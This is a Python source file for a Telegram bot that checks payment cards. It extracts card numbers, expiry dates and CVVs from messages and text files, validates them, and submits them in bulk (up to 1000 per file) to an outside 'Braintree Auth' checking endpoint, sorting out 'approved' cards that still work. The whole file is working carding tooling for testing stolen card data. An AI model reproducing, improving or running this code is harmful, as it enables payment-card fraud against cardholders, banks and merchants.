# Independent Telegram Bot for Card Checking with Smart Card Extraction
import time
import os
import asyncio
import aiofiles
import random
import aiohttp
import re
from aiogram import Router, types
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from binlookup import *

router = Router()

# Global dictionary to track stop flags for users
stop_flags = {}

# Keywords that indicate approval
approved_keywords = [
    'Nice! New payment method added',
    'Payment method successfully added.',
    'invalid postal code',
    'invalid street address',
    'insufficient funds',
    'Status code 81724: Duplicate card exists in the vault.',
    'Card Issuer Declined Cvv',
    'Status code avs: Gateway Rejected: avs',
    'Insufficient Funds',
    'APPROVED'
]

def extract_cards_from_text(text):
    """
    Extract valid card strings from mixed text using advanced regex and Luhn validation.
    Supports formats: 4111111111111111|12|2025|123 or 4111111111111111 12 2025 123
    Returns list of validated cards in standard format.
    """
    # Advanced regex patterns for different card formats
    patterns = [
        # Standard format with pipes: 4111111111111111|12|2025|123
        re.compile(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b'),
        
        # Space separated: 4111111111111111 12 2025 123
        re.compile(r'\b(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})\b'),
        
        # Mixed separators: 4111111111111111|12 2025|123
        re.compile(r'\b(\d{13,19})[\s|]+(\d{1,2})[\s|]+(\d{2,4})[\s|]+(\d{3,4})\b'),
        
        # With slashes: 4111111111111111/12/2025/123
        re.compile(r'\b(\d{13,19})/(\d{1,2})/(\d{2,4})/(\d{3,4})\b'),
        
        # With dashes: 4111111111111111-12-2025-123
        re.compile(r'\b(\d{13,19})-(\d{1,2})-(\d{2,4})-(\d{3,4})\b'),
        
        # With dots: 4111111111111111.12.2025.123
        re.compile(r'\b(\d{13,19})\.(\d{1,2})\.(\d{2,4})\.(\d{3,4})\b'),
        
        # With colons: 4111111111111111:12:2025:123
        re.compile(r'\b(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})\b')
    ]
    
    def luhn_checksum(card_number):
        """Calculate Luhn checksum for card validation"""
        def digits_of(n):
            return [int(d) for d in str(n)]
        
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        
        return checksum % 10

    def is_luhn_valid(card_number):
        """Validate card number using Luhn algorithm"""
        return luhn_checksum(card_number) == 0
    
    def is_valid_card_brand(card_number):
        """Check if card number belongs to known card brands"""
        # Visa: starts with 4
        if card_number.startswith('4') and len(card_number) in [13, 16, 19]:
            return True
        # Mastercard: starts with 5 or 2221-2720
        elif card_number.startswith('5') and len(card_number) == 16:
            return True
        elif card_number.startswith('2') and len(card_number) == 16:
            prefix = int(card_number[:4])
            if 2221 <= prefix <= 2720:
                return True
        # American Express: starts with 34 or 37
        elif card_number.startswith(('34', '37')) and len(card_number) == 15:
            return True
        # Discover: starts with 6
        elif card_number.startswith('6') and len(card_number) == 16:
            return True
        # Diners Club: starts with 30, 36, 38
        elif card_number.startswith(('30', '36', '38')) and len(card_number) == 14:
            return True
        # JCB: starts with 35
        elif card_number.startswith('35') and len(card_number) == 16:
            return True
        
        return False

    valid_cards = []
    processed_cards = set()  # Avoid duplicates
    
    # Try all patterns
    for pattern in patterns:
        matches = pattern.finditer(text)
        
        for match in matches:
            card_number = match.group(1)
            month = match.group(2)
            year = match.group(3)
            cvv = match.group(4)
            
            # Skip if already processed
            card_key = f"{card_number}|{month}|{year}|{cvv}"
            if card_key in processed_cards:
                continue
                
            processed_cards.add(card_key)
            
            # Normalize year (handle 2-digit years)
            if len(year) == 2:
                current_year = int(str(time.time())[:4])
                year_int = int(year)
                if year_int < 50:  # Assume 20xx for years < 50
                    year = f"20{year}"
                else:  # Assume 19xx for years >= 50
                    year = f"19{year}"
            
            # Validate all components
            try:
                month_int = int(month)
                year_int = int(year)
                cvv_len = len(cvv)
                
                # Basic validation
                if not (1 <= month_int <= 12):
                    continue
                if not (2020 <= year_int <= 2040):  # Reasonable year range
                    continue
                if cvv_len not in (3, 4):
                    continue
                if not (13 <= len(card_number) <= 19):
                    continue
                
                # Advanced validation
                if not card_number.isdigit():
                    continue
                if not is_valid_card_brand(card_number):
                    continue
                if not is_luhn_valid(card_number):
                    continue
                
                # Format and add to valid cards
                formatted_card = f"{card_number}|{month.zfill(2)}|{year}|{cvv}"
                valid_cards.append(formatted_card)
                
            except ValueError:
                continue
    
    return valid_cards

def validate_card_format(card: str):
    """
    Validate card in the format "number|month|year|cvv".
    Returns (True, "") if valid, or (False, error_message) if invalid.
    """
    parts = card.split("|")
    if len(parts) != 4:
        return False, "❌ Provide card in <code>number|month|year|cvv</code> format."
    
    card_number, month, year, cvv = parts
    
    if not card_number.isdigit():
        return False, "❌ Card number must be numeric."
    if not (13 <= len(card_number) <= 19):
        return False, "❌ Card number length is invalid."
    if not month.isdigit() or not (1 <= int(month) <= 12):
        return False, "❌ Invalid month."
    if not year.isdigit() or len(year) != 4:
        return False, "❌ Year must be 4 digits."
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        return False, "❌ Invalid CVV."
    
    return True, ""

async def check_single_card(card: str):
    """
    Check a single card using the B3 API
    Returns (success, response_text, is_approved)
    """
    url = "https://khudkab3-uf7j.onrender.com/b3"
    params = {"cc": card}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, params=params) as response:
                if response.status == 200:
                    result = await response.json()
                    response_text = result.get("response", "No response")
                    
                    # Check if card is approved
                    is_approved = any(keyword.lower() in response_text.lower() for keyword in approved_keywords)
                    
                    return True, response_text, is_approved
                else:
                    return False, f"API Error: {response.status}", False
    except Exception as e:
        return False, f"Network Error: {str(e)}", False

@router.message(Command("chk"))
async def chk_command(message: Message):
    """Enhanced single card check with smart extraction"""
    now = time.time()
    
    # Check if this is a reply to a message
    input_text = ""
    if message.reply_to_message:
        # Extract from replied message
        input_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        # Also check command arguments
        args = message.text.split(" ", 1)
        if len(args) > 1:
            input_text += " " + args[1]
    else:
        # Get from command arguments
        args = message.text.split(" ", 1)
        if len(args) < 2:
            await message.reply(
                "<b>❌ Usage:</b>\n"
                "• <code>/chk 4111111111111111|12|2025|123</code>\n"
                "• <code>/chk 4111111111111111 12 2025 123</code>\n"
                "• Reply to a message containing card details with <code>/chk</code>\n"
                "• <code>/chk</code> with card mixed in text",
                parse_mode="HTML"
            )
            return
        input_text = args[1]
    
    # Extract cards using smart regex
    extracted_cards = extract_cards_from_text(input_text)
    
    if not extracted_cards:
        # Fallback to manual parsing if no cards found
        args = message.text.split(" ", 1)
        if len(args) >= 2:
            # Try manual parsing
            card_parts = args[1].replace("|", " ").split()
            if len(card_parts) == 4:
                card_number, month, year, cvv = card_parts
                if len(year) == 2:
                    year = "20" + year
                card = f"{card_number}|{month}|{year}|{cvv}"
                extracted_cards = [card]
        
        if not extracted_cards:
            await message.reply(
                "<b>❌ No valid cards found!</b>\n\n"
                "<b>Supported formats:</b>\n"
                "• <code>4111111111111111|12|2025|123</code>\n"
                "• <code>4111111111111111 12 2025 123</code>\n"
                "• <code>4111111111111111/12/2025/123</code>\n"
                "• <code>4111111111111111-12-2025-123</code>\n"
                "• Mixed with other text",
                parse_mode="HTML"
            )
            return
    
    # Use first extracted card
    card = extracted_cards[0]
    
    # Show extraction info if multiple cards found
    extraction_info = ""
    if len(extracted_cards) > 1:
        extraction_info = f"\n<b>🔍 Found {len(extracted_cards)} cards, checking first one</b>\n"
    
    # Validate card format
    is_valid, error_msg = validate_card_format(card)
    if not is_valid:
        await message.reply(error_msg, parse_mode="HTML")
        return
    
    # Send processing message
    processing_message = await message.reply(
        f"<b>🔍 Card Detected!</b>{extraction_info}\n"
        f"<b>Processing:</b> <code>{card}</code>", 
        parse_mode="HTML"
    )
    
    success, response_text, is_approved = await check_single_card(card)
    
    if success:
        card_number = card.split("|")[0]
        # Extract BIN info
        bin_data = await get_bin_details(card_number[:6])
        bank_name, card_type, brand, issuer, country_name, country_flag, level = bin_data

        if is_approved or "APPROVED" in response_text:
            reply_text = f"""
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: <code>{card}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth  
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text}

𝗜𝗻𝗳𝗼: {brand} - {card_type} - {level}
𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_name} {country_flag}

𝗧𝗶𝗺𝗲: {round(time.time() - now, 2)} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
"""
        else:
            reason = response_text if "DECLINED" not in response_text else response_text.replace("DECLINED", "").strip()
            reply_text = f"""
𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌

𝗖𝗮𝗿𝗱: <code>{card}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth  
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {reason}

𝗜𝗻𝗳𝗼: {brand} - {card_type} - {level}
𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_name} {country_flag}

𝗧𝗶𝗺𝗲: {round(time.time() - now, 2)} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
"""

        await processing_message.edit_text(reply_text, parse_mode="HTML")
    else:
        await processing_message.edit_text(
            f"⚠️ <b>Error:</b> {response_text}",
            parse_mode="HTML"
        )

@router.message(Command("b3"))
async def b3_command(message: Message):
    """Alias for /chk command"""
    await chk_command(message)

@router.message(Command("mchk"))
async def mchk_command(message: Message):
    """Enhanced mass check with smart extraction (up to 20 cards)"""
    user_id = message.from_user.id
    
    # Get input text from command or reply
    input_text = ""
    if message.reply_to_message:
        input_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        args = message.text.split(" ", 1)
        if len(args) > 1:
            input_text += " " + args[1]
    else:
        args = message.text.split(" ", 1)
        if len(args) < 2:
            await message.reply(
                "<b>❌ Usage:</b>\n"
                "• <code>/mchk card1|mm|yyyy|cvv card2|mm|yyyy|cvv</code>\n"
                "• Reply to a message with cards using <code>/mchk</code>\n"
                "• Supports mixed text with multiple card formats\n"
                "• Maximum 20 cards per check",
                parse_mode="HTML"
            )
            return
        input_text = args[1]
    
    # Extract cards using smart regex
    extracted_cards = extract_cards_from_text(input_text)
    
    # Fallback to manual parsing if no smart extraction
    if not extracted_cards and not message.reply_to_message:
        lines = input_text.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line:
                card_parts = line.replace("|", " ").split()
                if len(card_parts) == 4:
                    card_number, month, year, cvv = card_parts
                    if len(year) == 2:
                        year = "20" + year
                    card = f"{card_number}|{month}|{year}|{cvv}"
                    if validate_card_format(card)[0]:
                        extracted_cards.append(card)
    
    if not extracted_cards:
        await message.reply(
            "<b>❌ No valid cards found!</b>\n\n"
            "<b>Supported formats:</b>\n"
            "• <code>4111111111111111|12|2025|123</code>\n"
            "• <code>4111111111111111 12 2025 123</code>\n"
            "• Multiple cards on separate lines\n"
            "• Mixed with other text",
            parse_mode="HTML"
        )
        return
    
    if len(extracted_cards) > 20:
        await message.reply(
            f"<b>❌ Too many cards found: {len(extracted_cards)}</b>\n"
            f"Maximum allowed: 20 cards per check.",
            parse_mode="HTML"
        )
        return
    
    # Initialize stop flag
    stop_flags[user_id] = False
    
    processing_message = await message.reply(
        f"<b>🔍 Extraction Complete!</b>\n"
        f"<b>Found:</b> {len(extracted_cards)} valid cards\n"
        f"<b>Processing...</b> ⏳", 
        parse_mode="HTML"
    )
    
    results = ""
    approved_count = 0
    declined_count = 0
    
    for i, card in enumerate(extracted_cards, 1):
        if stop_flags.get(user_id, False):
            results += "⚠️ <b>Checking stopped by user</b>\n\n"
            break
        
        try:
            # Check card
            success, response_text, is_approved = await check_single_card(card)
            card_number = card.split("|")[0]
            
            # Get BIN info
            bin_data = await get_bin_details(card_number[:6])
            bank_name, card_type, brand, issuer, country_name, country_flag, level = bin_data
            
            if success and is_approved:
                approved_count += 1
                status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            else:
                declined_count += 1
                status_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            
            results += f"""
<b>{status_text}</b>

𝗖𝗮𝗿𝗱: <code>{card}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text if success else 'API Error'}

𝗜𝗻𝗳𝗼: {brand} - {card_type} - {level}
𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_name} {country_flag}

"""
        except Exception as e:
            results += f"❌ <b>Error with card:</b> <code>{card}</code>\n<b>Reason:</b> {str(e)}\n\n"
        
        # Update progress
        progress_text = f"<b>🔍 Mass Check ⏳ ({i}/{len(extracted_cards)})</b>\n\n{results}"
        try:
            await processing_message.edit_text(progress_text, parse_mode="HTML")
        except:
            pass
        
        await asyncio.sleep(1)
    
    # Final summary
    summary = f"""
<b>✅ Mass Check Complete!</b>

<b>📊 Summary:</b>
• Cards Found: {len(extracted_cards)} 🔍
• Approved: {approved_count} ✅  
• Declined: {declined_count} ❌

{results}
"""
    
    try:
        await processing_message.edit_text(summary, parse_mode="HTML")
    except:
        await processing_message.edit_text(
            f"<b>✅ Mass Check Complete!</b>\n\n"
            f"<b>📊 Summary:</b>\n"
            f"• Cards Found: {len(extracted_cards)} 🔍\n"
            f"• Approved: {approved_count} ✅\n"  
            f"• Declined: {declined_count} ❌",
            parse_mode="HTML"
        )
        
        if results:
            chunk_size = 4000
            for i in range(0, len(results), chunk_size):
                chunk = results[i:i+chunk_size]
                await message.reply(chunk, parse_mode="HTML")

@router.message(Command("mtxt"))
async def mtxt_command(message: Message):
    """Enhanced mass check from text file with smart extraction"""
    user_id = message.from_user.id
    
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            "<b>❌ Reply to a text file (.txt)</b>\n\n"
            "<b>Smart features:</b>\n"
            "• Automatically extracts cards from mixed text\n"
            "• Supports multiple formats (|, space, /, -, etc.)\n"
            "• Luhn algorithm validation\n"
            "• Brand detection (Visa, MC, Amex, etc.)",
            parse_mode="HTML"
        )
        return
    
    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("❌ Please reply to a valid <code>.txt</code> file.", parse_mode="HTML")
        return
    
    # Download and process file
    file_path = f"downloads/{user_id}_{int(time.time())}.txt"
    os.makedirs("downloads", exist_ok=True)
    
    try:
        await message.reply_to_message.download(destination=file_path)
        
        async with aiofiles.open(file_path, mode='r', encoding='utf-8') as f:
            content = await f.read()
            
        # Smart extraction from file content
        extracted_cards = extract_cards_from_text(content)
        
    except Exception as e:
        await message.reply(f"❌ Error processing file: {str(e)}", parse_mode="HTML")
        return
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)
    
    if not extracted_cards:
        await message.reply(
            "<b>❌ No valid cards found in file!</b>\n\n"
            "<b>Supported formats:</b>\n"
            "• <code>4111111111111111|12|2025|123</code>\n"
            "• <code>4111111111111111 12 2025 123</code>\n"
            "• <code>4111111111111111/12/2025/123</code>\n"
            "• Cards mixed with other text",
            parse_mode="HTML"
        )
        return
    
    if len(extracted_cards) > 1000:
        await message.reply(
            f"<b>❌ Too many cards: {len(extracted_cards)}</b>\n"
            f"Maximum allowed: 1000 cards per file.",
            parse_mode="HTML"
        )
        return
    
    # Show extraction summary
    await message.reply(
        f"<b>🔍 Extraction Complete!</b>\n\n"
        f"<b>📊 Extraction Summary:</b>\n"
        f"• Cards Found: {len(extracted_cards)}\n"
        f"• All cards validated with Luhn algorithm ✓\n"
        f"• Starting mass check...",
        parse_mode="HTML"
    )
    
    # Initialize tracking
    stop_flags[user_id] = False
    approved, declined, errors = [], [], []
    total_cards = len(extracted_cards)
    
    # Create progress keyboard
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Card: Starting...", callback_data="none")],
        [InlineKeyboardButton(text="⏳ Response: Waiting...", callback_data="none")],
        [InlineKeyboardButton(text="✅ Approved: 0", callback_data="none")],
        [InlineKeyboardButton(text="❌ Declined: 0", callback_data="none")],
        [InlineKeyboardButton(text=f"🔍 Found: {total_cards}", callback_data="none")]
    ])
    
    progress_msg = await message.reply(f"processing: 0/{total_cards}", reply_markup=keyboard)
    
    for index, card in enumerate(extracted_cards, 1):
        if stop_flags.get(user_id, False):
            break
        
        try:
            card_number = card.split("|")[0]
            
            # Update progress display
            keyboard.inline_keyboard[0][0].text = f"🔄 Card: {card_number[:6]}...{card_number[-4:]}"
            keyboard.inline_keyboard[1][0].text = f"⏳ Response: Checking..."
            keyboard.inline_keyboard[2][0].text = f"✅ Approved: {len(approved)}"
            keyboard.inline_keyboard[3][0].text = f"❌ Declined: {len(declined)}"
            
            try:
                await progress_msg.edit_text(f" processing: {index-1}/{total_cards}", reply_markup=keyboard)
            except:
                pass
            
            # Check card
            success, response_text, is_approved = await check_single_card(card)
            
            if success:
                # Get BIN info
                bin_data = await get_bin_details(card_number[:6])
                bank_name, card_type, brand, issuer, country_name, country_flag, level = bin_data
                
                if is_approved:
                    approved.append(f"{card} , response: {response_text}")
                    
                    # Send individual notification
                    notification = f"""
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: <code>{card}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text}

𝗜𝗻𝗳𝗼: {brand} - {card_type} - {level}
𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_name} {country_flag}
"""
                    await message.reply(notification, parse_mode="HTML")
                else:
                    declined.append(f"{card} , response: {response_text}")
                
                # Update response display
                short_response = (response_text[:35] + "...") if len(response_text) > 38 else response_text
                keyboard.inline_keyboard[1][0].text = f"{'✅' if is_approved else '❌'} {short_response}"
            else:
                errors.append(f"{card} , response: {response_text}")
                keyboard.inline_keyboard[1][0].text = f"❌ Response: Error"
        
        except Exception as e:
            errors.append(f"{card} , response: Exception: {str(e)}")
            keyboard.inline_keyboard[1][0].text = f"❌ Response: Exception"
        
        # Update counts
        keyboard.inline_keyboard[2][0].text = f"✅ Approved: {len(approved)}"
        keyboard.inline_keyboard[3][0].text = f"❌ Declined: {len(declined)}"
        
        try:
            await progress_msg.edit_text(f" processing: {index}/{total_cards}", reply_markup=keyboard)
        except:
            pass
        
        await asyncio.sleep(2)
    
    # Final summary
    await progress_msg.edit_text("✅  Processing Complete!", reply_markup=keyboard)
    
    total_checked = len(approved) + len(declined) + len(errors)
    summary_text = f"""
<b>🔍  File Check Complete!</b>

<b>📊 Final Summary:</b>
•  Extracted: {total_cards}
• Total Checked: {total_checked}
• Approved: {len(approved)} 🟢
• Declined: {len(declined)} 🔴  
• Errors: {len(errors)} ⚠️

<b>🧠  Features Used:</b>
• Luhn Algorithm Validation ✓
• Multi-Format Detection ✓
• Brand Validation ✓
• Duplicate Removal ✓
"""
    
    await message.reply(summary_text, parse_mode="HTML")
    
    # Generate result files
    for name, lst in [("approved", approved), ("declined", declined), ("errors", errors)]:
        if lst:
            filename = f"smart_{name}_{user_id}_{random.randint(100000, 999999)}.txt"
            try:
                async with aiofiles.open(filename, mode='w', encoding='utf-8') as f:
                    await f.write(f"# Smart Extracted {name.title()} Cards\n")
                    await f.write(f"# Total: {len(lst)}\n\n")
                    await f.write("\n".join(lst))
                
                with open(filename, 'rb') as doc:
                    await message.reply_document(
                        document=doc,
                        caption=f"<b>🔍 {name.title()} Cards ({len(lst)})</b>",
                        parse_mode="HTML"
                    )
                
                os.remove(filename)
            except Exception as e:
                await message.reply(f"❌ Error generating {name} file: {str(e)}", parse_mode="HTML")

@router.message(Command("stop"))
async def stop_command(message: Message):
    """Stop ongoing mass check"""
    user_id = message.from_user.id
    stop_flags[user_id] = True
    await message.reply("⚠️ <b>Stopping check...</b> Will halt after current card.", parse_mode="HTML")

@router.message(Command("help"))
async def help_command(message: Message):
    """Show help information"""
    help_text = """
<b>🤖 sexy Card Checker Bot</b>

<b>🔍 Commands:</b>
• <code>/chk</code> - sexy single card check
• <code>/b3</code> - Alias for /chk
• <code>/mchk</code> - sexy mass check (up to 20 cards)
• <code>/mtxt</code> - sexy file processing (up to 1000 cards)
• <code>/stop</code> - Stop ongoing checks

<b>🧠 sexy Features:</b>
• Auto-extracts cards from mixed text
• Supports multiple formats (|, space, /, -, :, .)
• Luhn algorithm validation
• Brand detection (Visa, MC, Amex, Discover, etc.)
• Reply to messages with cards
• Duplicate removal
• Progress tracking

<b>📋 Supported Formats:</b>
• <code>4111111111111111|12|2025|123</code>
• <code>4111111111111111 12 2025 123</code>
• <code>4111111111111111/12/2025/123</code>
• <code>4111111111111111-12-2025-123</code>
• <code>4111111111111111:12:2025:123</code>
• <code>4111111111111111.12.2025.123</code>

<b>💡 Usage Examples:</b>
• <code>/chk 4111111111111111|12|25|123</code>
• Reply to any message and use <code>/chk</code>
• <code>/mchk</code> with multiple cards
• <code>/mtxt</code> reply to .txt file

<b>🚀 Gateway:</b> Braintree Auth
<b>⚡ Speed:</b> sexy extraction + validation
"""
    await message.reply(help_text, parse_mode="HTML")
